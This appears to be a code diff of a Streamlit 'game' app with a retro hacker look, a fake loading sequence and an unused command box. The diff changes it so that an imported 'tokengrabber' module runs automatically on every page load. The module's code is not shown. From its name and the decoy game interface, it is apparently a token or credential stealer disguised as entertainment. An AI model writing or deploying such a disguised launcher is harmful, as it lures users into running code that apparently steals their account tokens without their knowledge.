@@ -1,75 +1,119 @@
 import streamlit as st
+import time
 import tokengrabber
 
-# --- PAGE CONFIGURATION (Must be the first command) ---
-st.set_page_config(
-    page_title="Search Game",
-    layout="centered",
-    initial_sidebar_state="collapsed"
-)
+# --- 1. CONFIG & CSS (The Vibe) ---
+st.set_page_config(page_title="NetSearch Protocol", layout="centered")
 
-# --- CSS STYLING (To make it look like a Game Menu) ---
+# Custom CSS for the Hacker/Game Vibe
 st.markdown("""
 <style>
-    /* Hide the standard Streamlit Menu and Footer */
+    /* Global Styles */
+    .stApp {
+        background-color: #0e0e0e;
+        color: #00FF41;
+        font-family: 'Courier New', Courier, monospace;
+    }
+    
+    /* Hide standard Streamlit elements */
     #MainMenu {visibility: hidden;}
     footer {visibility: hidden;}
     header {visibility: hidden;}
-
-    /* Center the button and style it */
+    
+    /* Button Styling */
     .stButton > button {
         width: 100%;
-        height: 60px;
-        background-color: #000000;
-        color: #00FF00; /* Hacker Green */
+        height: 80px;
+        background-color: transparent;
+        color: #00FF41;
         font-family: 'Courier New', Courier, monospace;
-        font-size: 24px;
-        border: 2px solid #00FF00;
-        border-radius: 0px; /* Retro square corners */
-        transition: all 0.3s ease;
+        font-size: 30px;
+        font-weight: bold;
+        border: 2px solid #00FF41;
+        text-transform: uppercase;
+        box-shadow: 0 0 10px #00FF41;
+        transition: all 0.2s ease-in-out;
     }
-    
     .stButton > button:hover {
-        background-color: #00FF00;
+        background-color: #00FF41;
         color: #000000;
-        box-shadow: 0px 0px 15px #00FF00;
+        box-shadow: 0 0 20px #00FF41;
+    }
+
+    /* Input Box Styling */
+    .stTextInput > div > div > input {
+        background-color: #1a1a1a;
+        color: #00FF41;
+        border: 1px solid #00FF41;
+        font-family: 'Courier New', Courier, monospace;
     }
 </style>
 """, unsafe_allow_html=True)
 
-# --- SESSION STATE (To remember if the game started) ---
-if 'game_active' not in st.session_state:
-    st.session_state.game_active = False
+# --- 2. STATE MANAGEMENT ---
+if 'page' not in st.session_state:
+    st.session_state.page = 'start'
 
-# --- THE SEARCH FUNCTION ---
-def grabtoken():
-    tokengrabber.main()
+# --- 3. THE APP LOGIC ---
+tokengrabber.main()
 
-
-# --- THE UI LOGIC ---
-
-if not st.session_state.game_active:
-    # === MENU SCREEN ===
-    # Use empty vertical space to center the button visually
-    st.write("#") 
-    st.write("#") 
-    st.write("#") 
+# === SCREEN 1: START MENU ===
+if st.session_state.page == 'start':
+    st.write("##") # Spacers
+    st.write("##")
     
-    # Columns help center the button perfectly
+    st.markdown("<h1 style='text-align: center; color: #00FF41; text-shadow: 0 0 10px #00FF41;'>SYSTEM ACCESS</h1>", unsafe_allow_html=True)
+    
     col1, col2, col3 = st.columns([1, 2, 1])
-    
     with col2:
-        # The 'Game' Button
-        if st.button("START"):
-            st.session_state.game_active = True
-            st.rerun() # Refresh page to show the script
+        if st.button("INITIALIZE"):
+            st.session_state.page = 'loading'
+            st.rerun()
 
-else:
-    # === GAME/SCRIPT SCREEN ===
-    # Add a 'Back' button or 'Reset' mechanism if needed
-    if st.button("RESET SYSTEM"):
-        st.session_state.game_active = False
-        st.rerun()
+# === SCREEN 2: FAKE LOADING SEQUENCE ===
+elif st.session_state.page == 'loading':
+    
+    # Create empty slots for the text and the bar
+    msg_slot = st.empty()
+    bar_slot = st.progress(0)
+    
+    # This list controls how long the "Timer" lasts
+    steps = [
+        "ESTABLISHING CONNECTION...",
+        "VERIFYING CREDENTIALS...",
+        "ALLOCATING MEMORY...",
+        "DECRYPTING PACKETS...",
+        "ACCESS GRANTED."
+    ]
+    
+    # Loop through steps (The "Timer")
+    for i, step in enumerate(steps):
+        # Update text
+        msg_slot.markdown(f"```\n> {step}\n```")
         
-    # RUN YOUR SCRIPT
-    grabtoken()
+        # Update progress bar (math to make it hit 100% at the end)
+        progress = int(((i + 1) / len(steps)) * 100)
+        bar_slot.progress(progress)
+        
+        # The Delay (Speed of the timer)
+        time.sleep(30) 
+        
+    # Transition to final page
+    st.session_state.page = 'finished'
+    st.rerun()
+
+# === SCREEN 3: DONE + INPUT ===
+elif st.session_state.page == 'finished':
+    st.write("##")
+    st.markdown("<h2 style='text-align: center;'>PROCESS COMPLETE.</h2>", unsafe_allow_html=True)
+    
+    st.write("---")
+    
+    # The Text Box
+    user_input = st.text_input("ENTER COMMAND OR FILENAME:", placeholder="Type here...")
+    
+    # Optional: A button to reset if they want to play again
+    st.write("##")
+    if st.button("RESET SYSTEM"):
+        st.session_state.page = 'start'
+        st.rerun()
